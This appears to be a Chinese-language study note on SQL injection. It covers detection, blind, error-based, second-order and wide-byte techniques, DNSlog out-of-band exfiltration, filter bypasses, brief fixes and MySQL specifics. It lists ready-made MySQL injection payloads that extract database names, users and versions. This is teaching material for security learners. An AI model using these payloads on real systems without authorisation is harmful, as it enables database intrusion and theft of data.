掌握一些目标的信息后，有时候可以直接从那些信息里找到已知的漏洞，没有的话如果是黑盒就只能从这个网站上找着手点。

有数据交互的地方都是着手点。

注入漏洞本质上都是代码拼接。
SQL 注入：在网页上输入：1，后端执行的代码是 select xxx,xxx from xxx where id = '1'。
如果开发没有做过滤，输入：1' union database() # ,就执行了你想要执行的数据库代码。

同时也需要一个输入和输出点，输入是执行你想要的命令，输出是要可以查看到结果，不然没有意义。

1. 判断是否存在 SQL 注入
在原本要输入的参数后加单引号看是否会报错

2. SQL 注入类型
存在注入就可以用 union 语句进行注入，但是当页面不直接返回结果的时候就可以用『盲注』。
    1. 布尔盲注
        具体场景比如输入 ID 为 1 页面正常返回时，在后面加上一个判断，如果页面还是正常返回表示那个判断是正确的，
        如果页面和 ID 为 1 时不一样则表示这个判断是错误的：1' and length(database())>10 #
    2. 时间盲注
        如果布尔盲注返回的页面没有变化，可以试一下时间盲注，通过页面是否按照规定时间响应来确定这个判断是否正确：id=1 and if(length(database())=8,sleep(5),1)
    3. 报错注入
        联合查询受限且能返回错误信息的情况下，用报错注入会比盲注快捷方便一点，毕竟盲注需要请求很多次。
        原理主要是利用数据库的机制人为制造错误，记一下这4个常用的：
            1. 数据类型溢出
                mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。
                取反溢出：id=1' union select (!(select * from (select user())x) - ~0),2,3--+
                exp 溢出：id=1' union select (exp(~(select * from(select database())x))),2,3--+
            2. xpath 语法错误
                MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()，因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。
                这两个函数都是要求第二个参数是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里。
                id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+
                id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
            3. floor() 报错注入
                id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+
            4. 列名重复
                id=1'union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+
    4. 二次注入
        输入的内容被 addslashes 添加了反斜杠转义比如：1' -> 1\'，在这里无法造成注入漏洞，但是在数据库里的数据是没有反斜杠的，存到数据库里的依然是 1'，
        所以如果在页面另一个地方取出这个数据就可以造成注入漏洞。
    5. 宽字节注入
        需要数据库编码为 GBK，%df%5c 是一个繁体字，反斜杠编码是 %5c，如果传入的单引号被转义，可以加上 %df' 来注入单引号
    6. cookie 注入、XFF 注入
        注入点改变了而已
    7. base 64 注入
        编码后再注入
    8. DNSlog 注入
    	在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起DNS请求，这个时候就可以通过这种方式把想获得的数据外带出来。
	攻击者提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。
	所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。
	
3. 绕过
    大小写、双写、编码、内联注释 -> 有报错但是无法注入关键字：and、or 等
    
4. 修复
	过滤危险字符
	预编译->占位符
                
5. 常见数据库特点
    1. MySQL
        1. 5.0 以下没有 information_schema 这个系统表，无法列表名等，只能暴力跑表名
            SCHEMATA
		 		SCHEMA_NAME
		 	TABLES
		 		TABLE_SCHEMA、TABLE_NAME
		 	COLUMNS
		 		TABLE_SCHEMA、TABLE_NAME、COLUMN_NAME
                
        2. MySQL 5.5.53 前的版本没有配置 secure_file_prev，可以直接通过 SQL 语句读写文件，> 5.5.53 版本需要设置 secure_file_prev 为空，为 null 时不可读写。
